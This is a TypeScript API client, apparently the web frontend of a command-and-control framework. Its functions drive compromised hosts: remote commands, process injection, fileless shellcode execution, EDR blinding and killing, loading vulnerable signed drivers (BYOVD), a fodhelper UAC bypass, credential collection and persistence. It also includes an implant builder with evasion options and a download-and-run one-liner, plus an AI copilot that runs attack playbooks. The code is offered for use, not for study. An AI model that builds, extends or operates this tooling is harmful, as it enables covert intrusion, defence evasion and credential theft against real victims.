import axios from 'axios'
import type { Session, Task, TaskStats, LogEntry, TaskRequest, ListenerInfo } from '../types'

export interface Tunnel {
  id: number
  target_addr: string
  target_port: number
  active: boolean
  created_at: string
  bytes_in: number
  bytes_out: number
  session_id?: string
  local_port?: number
}

const api = axios.create({
  baseURL: '/api/v1',
  timeout: 120000, // 2分钟，兼容 spawn 模式编译 EXE
  headers: {
    'Content-Type': 'application/json',
  },
})

api.interceptors.request.use((config) => {
  const token = localStorage.getItem('toshell-token')
  if (token) {
    config.headers.Authorization = `Bearer ${token}`
  }
  return config
})

api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response?.status === 401) {
      localStorage.removeItem('toshell-token')
      window.location.href = '/login'
    }
    return Promise.reject(error)
  }
)

export const authApi = {
  login: (username: string, password: string) =>
    api.post<{ token: string; username: string }>('/login', { username, password }),
  logout: () => api.post('/logout'),
  verify: () => api.get('/verify'),
}

export const sessionApi = {
  list: () => api.get<{ sessions: Session[]; count: number }>('/sessions'),
  get: (id: string) => api.get<Session>(`/sessions/${id}`),
  update: (id: string, comment: string) => api.patch(`/sessions/${id}`, { comment }),
  delete: (id: string) => api.delete(`/sessions/${id}`),
  /** 会话能力清单：可用功能/操作面板（按 OS+通道推导） */
  getCapabilities: (id: string) => api.get<{ tabs: Record<string, boolean>; features: string[] }>(`/sessions/${id}/capabilities`),
  interact: (id: string, command: string, taskType?: string) => 
    api.post(`/sessions/${id}/interact`, { command, task_type: taskType || 'command' }),
  listFiles: (id: string, path: string) => 
    api.get(`/sessions/${id}/files`, { params: { path } }),
  downloadFile: (id: string, path: string) => 
    api.post(`/sessions/${id}/files/download`, { path }),
  deleteFile: (id: string, path: string) => 
    api.post(`/sessions/${id}/files/delete`, { path }),
  uploadFile: (id: string, payload: {
    upload_id: string
    filename: string
    path: string
    size: number
    offset: number
    data: string
    done: boolean
  }) =>
    api.post(`/sessions/${id}/files/upload`, payload),
  listProcesses: (id: string) => 
    api.get(`/sessions/${id}/processes`),
  killProcess: (id: string, pid: number) => 
    api.delete(`/sessions/${id}/processes/${pid}`),
  processInject: (id: string, method: string, pid: number, shellcode?: string, dllPath?: string) =>
    api.post(`/sessions/${id}/inject`, { method, pid, shellcode, dll_path: dllPath }),
  processInjection: (id: string, data: {
    method: string
    target_pid?: number | null
    target_path?: string | null
    payload?: string
    use_default_payload?: boolean
  }) =>
    api.post<{ task_id: number; message: string }>(`/sessions/${id}/process-injection`, data),
  loadBof: (id: string, data: string, args?: string) =>
    api.post(`/sessions/${id}/bof`, { data, args }),
  screenStream: (id: string, action: 'start' | 'stop') =>
    api.post<{ task_id: number; task_type: string; action: string; message: string }>(`/sessions/${id}/screen-stream`, { action }),
  relay: (id: string, action: 'start' | 'stop' | 'status', addr?: string) =>
    api.post<{ task_id: number; task_type: string; action: string; addr: string; message: string }>(`/sessions/${id}/relay`, { action, addr }),
  listRelayNodes: () =>
    api.get<{ relay_nodes: RelayNode[]; count: number }>('/relay-nodes'),
  edrBlind: (id: string) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/blind`, {}),
  edrKill: (id: string, processes?: string[]) =>
    api.post<{ task_id: number; task_type: string; count: number; message: string }>(`/sessions/${id}/edr/kill`, { processes }),
  byovdLoad: (id: string, payload: { driver_b64: string; service_name?: string; device_name?: string }) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-load`, payload),
  byovdUnload: (id: string, serviceName?: string) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-unload`, { service_name: serviceName }),
  pplKill: (id: string, processes?: string[]) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/ppl-kill`, { processes }),
  filelessExec: (id: string, payload: {
    kind: 'shellcode' | 'bof' | 'dll' | 'exe'
    payload_b64: string
    args?: string
    entry?: string
    arch?: string
  }) =>
    api.post<{ task_id: number; task_type: string; kind: string; message: string }>(`/sessions/${id}/fileless-exec`, payload),
  // UAC 提权：fodhelper 拉起高完整性进程，内存执行 shellcode 回连上线
  privescUAC: (id: string) =>
    api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/privesc-uac`),
}

export const tunnelApi = {
  list: () => api.get<{ servers: SOCKS5ServerInfo[]; count: number }>('/tunnels'),
  create: (session_id: string, local_port: number) => 
    api.post('/tunnels', { session_id, local_port }),
  delete: (sessionId: string) => api.delete(`/tunnels/${sessionId}`),
}

export interface RelayNode {
  session_id: string
  hostname: string
  addr: string
  host: string
  port: string
}

export interface BuiltinDriver {
  name: string
  description: string
  device: string
  service: string
  size: number
  sha256: string
}

// 内置 BYOVD 利用驱动（RTCore64 / dbutil_2_3，原厂签名二进制，嵌在服务器二进制中）
export const driversApi = {
  list: () => api.get<{ drivers: BuiltinDriver[]; count: number }>('/drivers'),
  raw: async (name: string) => {
    const r = await api.get<ArrayBuffer>(`/drivers/${encodeURIComponent(name)}/raw`, { responseType: 'arraybuffer' })
    return r.data
  },
}

// 运行时设置（设置页真实读写，保存后热生效）
export interface SettingsResponse {
  general: Record<string, unknown>
  listener: Record<string, unknown>
  implant: Record<string, unknown>
  notifications: Record<string, unknown>
  security: Record<string, unknown>
}
export const settingsApi = {
  get: () => api.get<SettingsResponse>('/settings'),
  save: (updates: Record<string, unknown>) =>
    api.put<{ message: string; hot: boolean }>('/settings', updates),
  testWebhook: (payload: { url: string; content?: string; format?: string; secret?: string }) =>
    api.post<{ ok: boolean; status_code: number; response: string }>('/settings/webhook/test', payload),
}

export interface SOCKS5ServerInfo {
  session_id: string
  local_port: number
  tunnels: Tunnel[]
}

export interface Plugin {
  id: string
  name: string
  description: string
  type: string
  size: number
  path: string
  created_at: string
  updated_at: string
}

export const pluginApi = {
  list: () => api.get<{ plugins: Plugin[]; count: number }>('/plugins'),
  get: (id: string) => api.get<Plugin>(`/plugins/${id}`),
  upload: (file: File, description?: string) => {
    const formData = new FormData()
    formData.append('file', file)
    if (description) {
      formData.append('description', description)
    }
    return api.post<Plugin>('/plugins', formData, {
    headers: { 'Content-Type': 'multipart/form-data' },
    })
  },
  delete: (id: string) => api.delete(`/plugins/${id}`),
  refresh: () => api.post<{ plugins: Plugin[]; count: number }>('/plugins/refresh'),
  load: (sessionId: string, pluginId: string, args?: string) => 
    api.post<{ task_id: number; plugin: Plugin; status: string; message: string }>(`/sessions/${sessionId}/plugin`, { 
      plugin_id: pluginId, 
      args: args || '' 
    }),
}



export const taskApi = {
  list: () => api.get<Task[]>('/tasks'),
  get: (id: number) => api.get<Task>(`/tasks/${id}`),
  create: (data: TaskRequest) => api.post<Task>('/tasks', data),
  delete: (id: number) => api.delete(`/tasks/${id}`),
  cancel: (id: number) => api.post(`/tasks/${id}/cancel`),
  stats: () => api.get<{ stats: TaskStats }>('/tasks/stats'),
}

export const logApi = {
  list: (limit?: number, level?: string) => 
    api.get<{ logs: LogEntry[]; count: number }>('/logs', { 
      params: { limit, level } 
    }),
}

export const systemApi = {
  stats: () => api.get('/system/stats'),
  health: () => api.get('/health'),
}

export interface ListenerPayload {
  name: string
  type: string
  protocol: string
  bind_addr: string
  bind_port: number
  public_addr?: string
}

export const listenerApi = {
  list: () => api.get<{ listeners: ListenerInfo[]; count: number }>('/listeners'),
  create: (data: ListenerPayload) => api.post<ListenerInfo>('/listeners', data),
  update: (id: string, data: ListenerPayload) => api.put<ListenerInfo>(`/listeners/${id}`, data),
  get: (id: string) => api.get<ListenerInfo>(`/listeners/${id}`),
  start: (id: string) => api.post<{ id: string; status: string; message: string }>(`/listeners/${id}/start`),
  stop: (id: string) => api.post<{ id: string; status: string; message: string }>(`/listeners/${id}/stop`),
  delete: (id: string) => api.delete<{ message: string }>(`/listeners/${id}`),
}

export interface BuildRequest {
  name: string
  format: string
  /** 植入端语言：go(默认,全功能) / c(C 植入端,体积极小,仅 Windows) */
  language?: string
  listener_id: string
  server_url: string
  protocol: string
  interval: number
  jitter: number
  retry_count: number
  retry_wait: number
  kill_date: string
  working_hours: string
  relay_listen?: string
  front_domain?: string
  profile?: string
  output_path: string
  os: string
  arch: string
  // Evasion options
  xor_encrypt?: boolean
  xor_key_size?: number
  garble_enabled?: boolean
  upx_enabled?: boolean
  startup_delay_min?: number
  startup_delay_max?: number
}

export interface BuildResponse {
  id: string
  name: string
  format: string
  size: number
  sha256: string
  build_time: string
  download_url: string
  /** 一条命令上线：复制到目标机执行即可静默下载并运行载荷（exe/raw 生效） */
  one_liner?: string
}

export interface BuilderInfo {
  formats: string[]
  protocols: string[]
  os: string[]
  arch: string[]
  listeners: ListenerInfo[]
  /** 植入端语言能力：go 恒可用，c 依赖服务端 mingw gcc */
  languages?: {
    go: boolean
    c: boolean
    c_message?: string
  }
  options: {
    interval: { min: number; max: number; default: number }
    jitter: { min: number; max: number; default: number }
    retry_count: { min: number; max: number; default: number }
    retry_wait: { min: number; max: number; default: number }
  }
  evasion?: {
    garble_available: boolean
    upx_available: boolean
  }
}

export const builderApi = {
  list: () => api.get<BuilderInfo>('/builders'),
  create: (data: BuildRequest) => api.post<BuildResponse>('/builders', data),
  download: (data: BuildRequest) => api.post('/builders/download', data, {
    responseType: 'blob',
  }),
}

export interface InjectionMethod {
  name: string
  description: string
  requires_pid: boolean
  requires_path: boolean
  requires_shellcode: boolean
  requires_dll: boolean
}

export interface InjectionRequest {
  method: string
  target_pid?: number
  target_process_name?: string
  target_path?: string
  shellcode?: string
  dll_path?: string
  parent_pid?: number
}

export const injectionApi = {
  listMethods: () => api.get<{ methods: InjectionMethod[]; count: number }>('/injection/methods'),
  execute: (sessionId: string, data: InjectionRequest) =>
    api.post<{ task_id: number; task_type: string; method: string; message: string }>(`/sessions/${sessionId}/injection`, data),
}

export interface PersistenceMethod {
  name: string
  description: string
  reliable: boolean
}

export const persistenceApi = {
  listMethods: (sessionId: string) =>
    api.get<{ task_id: number; message: string }>(`/sessions/${sessionId}/persistence`),
  install: (sessionId: string, method: string) =>
    api.post<{ task_id: number; method: string; message: string }>(`/sessions/${sessionId}/persistence/install`, { method }),
  remove: (sessionId: string) =>
    api.post<{ task_id: number; message: string }>(`/sessions/${sessionId}/persistence/remove`, {}),
}

export const credentialApi = {
  collect: (sessionId: string, action: string = 'all') =>
    api.post(`/sessions/${sessionId}/credentials`, { action }),
}

export const screenshotApi = {
  take: (sessionId: string) =>
    api.post<{ task_id: number; message: string }>(`/sessions/${sessionId}/screenshot`),
  getResult: (taskId: number) =>
    api.get<{ output?: string; error?: string; status: string }>(`/tasks/${taskId}`),
}

export const templateApi = {
  list: () => api.get('/templates'),
  get: (id: string) => api.get(`/templates/${id}`),
  create: (data: { name: string; description: string; category: string; tasks: any[] }) =>
    api.post('/templates', data),
  update: (id: string, data: { name: string; description: string; category: string; tasks: any[] }) =>
    api.put(`/templates/${id}`, data),
  delete: (id: string) => api.delete(`/templates/${id}`),
  execute: (sessionId: string, templateId: string) =>
    api.post(`/sessions/${sessionId}/workflow`, { template_id: templateId }),
  getWorkflow: (id: string) => api.get(`/workflows/${id}`),
}

export interface CopilotTrace {
  name: string
  args?: Record<string, string>
  result?: string
  error?: string
}

// 副驾驶工具审批请求（normal 权限模式下影响会话的操作需用户确认）
export interface ConsentReq {
  token: string
  tool: string
  args?: Record<string, string>
  desc?: string
}

// AI 副驾驶：LLM 聊天 + 工具调用（端点 /copilot/status /copilot/chat /copilot/consent）
export const copilotApi = {
  status: () => api.get<{ enabled: boolean; model: string; consent_mode?: string }>('/copilot/status'),
  chat: (messages: { role: string; content: string }[]) =>
    api.post<{ reply: string; traces: CopilotTrace[]; pending_consents?: ConsentReq[] }>('/copilot/chat', { messages }, { timeout: 240000 }),
  consent: (token: string, decision: 'allow' | 'deny') =>
    api.post<{ reply: string; traces: CopilotTrace[]; pending_consents?: ConsentReq[] }>('/copilot/consent', { token, decision }, { timeout: 240000 }),
  playbooks: () => api.get<{ playbooks: Playbook[]; count: number }>('/copilot/playbooks'),
  runPlaybook: (playbook_id: string, session_id: string) =>
    api.post<{ run_id: string; status: string }>('/copilot/playbook/run', { playbook_id, session_id }),
  playbookRuns: () => api.get<{ runs: PlaybookRun[]; count: number }>('/copilot/playbook/runs'),
  playbookRun: (id: string) => api.get<PlaybookRun>(`/copilot/playbook/runs/${id}`),
}

export interface Playbook {
  id: string
  name: string
  desc: string
  steps: { name: string; tool: string }[]
  fallback: string
}
export interface PlaybookRun {
  id: string
  playbook: string
  session_id: string
  status: string
  results: { name: string; tool: string; status: string; output?: string; error?: string; task_id?: number }[]
  created_at: number
  analysis?: string
  batch_id?: string
}

// 通道健康：TCP/HTTP/WS/MQTT 四通道在线数/监听器数
export interface ChannelHealth {
  type: string
  online: number
  total_session: number
  listeners: number
  running: boolean
}
export const channelsApi = {
  health: () => api.get<{ channels: ChannelHealth[]; total_online: number; total_session: number }>('/channels/health'),
}

export default api
